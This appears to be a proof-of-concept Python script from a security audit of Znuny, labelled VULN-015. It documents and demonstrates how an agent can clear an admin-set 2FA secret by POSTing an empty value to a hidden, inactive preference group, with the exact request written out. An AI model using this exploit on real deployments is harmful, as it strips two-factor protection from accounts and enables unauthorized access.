#!/usr/bin/env python3
r"""
VULN-015 — Active=0 preference-group bypass → clear admin-provisioned 2FA secret
================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentPreferences.pm:251 (checks group REGISTERED, not Active)
                  targets/Znuny/Kernel/Output/HTML/Preferences/Generic.pm:82-89 (unconditional SetPreferences)
                  targets/Znuny/Kernel/Config/Files/XML/Framework.xml:3464-3482 (group ships Active=0; regex ^([A-Z2-7]{16}|)$ accepts empty)
Vulnerability   : CWE-862 / broken auth — self-service disable of an admin-set 2FA secret

The Update path validates only that the preference Group is *registered*, never that it is
*Active* (Active is checked only in the display path). The GoogleAuthenticator 2FA-secret group
ships Active=0 (hidden from the UI) but registered, and its ValidateRegex accepts an EMPTY value.
So a user can POST Group=GoogleAuthenticatorSecretKey with an empty value and clear their own
admin-provisioned 2FA secret; with AuthTwoFactorModule::AllowEmptySecret=1 (default) the next
login then needs no token.

Proof: admin provisions a 2FA secret for an agent; the agent clears it via the hidden-group Update
POST; the stored secret becomes empty.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def secret_of(uid):
    rows = C.db("SELECT preferences_value FROM user_preferences "
                f"WHERE user_id={uid} AND preferences_key='UserGoogleAuthenticatorSecretKey'")
    return rows[0][0] if rows else None

def main():
    C.banner("VULN-015", "Active=0 preference-group bypass clears admin-set 2FA secret",
             ["AgentPreferences.pm:251 checks group registered, not Active; regex accepts empty -> clears secret"])
    sfx = C.rid()
    u, pw = C.create_agent(login=f"tfa_{sfx}", groups=["users"])
    uid = C.agent_uid(u)
    # admin provisions a 2FA secret for the agent (as an admin would)
    admin_secret = "ABCDEFGHIJKLMNOP"
    C.perl_eval("$Kernel::OM->Get('Kernel::System::User')->SetPreferences("
                "UserID=>%d,Key=>'UserGoogleAuthenticatorSecretKey',Value=>'%s');print 'set';"
                % (uid, admin_secret))
    before = secret_of(uid)
    C.log("SETUP", f"admin-provisioned 2FA secret for {u}: {before!r}")

    a = C.agent_client(u, pw)
    tok, _ = a.refresh_token(C.AGENT_URL + "?Action=AgentPreferences")
    # POST to the HIDDEN (Active=0) but registered group with an EMPTY value
    C.log("STEP", "agent POST AgentPreferences;Update;Group=GoogleAuthenticatorSecretKey;UserGoogleAuthenticatorSecretKey= (empty)")
    r = a.post(data={"Action": "AgentPreferences", "Subaction": "Update",
                     "Group": "GoogleAuthenticatorSecretKey",
                     "UserGoogleAuthenticatorSecretKey": "", "ChallengeToken": tok})
    after = secret_of(uid)
    C.log("PROOF", f"stored 2FA secret before={before!r} after={after!r}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "POST /znuny/index.pl  Action=AgentPreferences;Subaction=Update;"
        "Group=GoogleAuthenticatorSecretKey;UserGoogleAuthenticatorSecretKey=;ChallengeToken=<agent>\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"2FA secret before={before}\n2FA secret after={after}\n")

    if before and (after is None or after == ""):
        C.confirmed(f"the agent cleared their admin-provisioned 2FA secret (was {before!r}, now "
                    f"{after!r}) by POSTing to the hidden Active=0 'GoogleAuthenticatorSecretKey' "
                    "group with an empty value — the Update path never checks Active, and the regex "
                    "accepts empty (with AllowEmptySecret=1 default, next login needs no token).")
    else:
        C.failed(f"secret not cleared: before={before!r} after={after!r}")

if __name__ == "__main__":
    main()
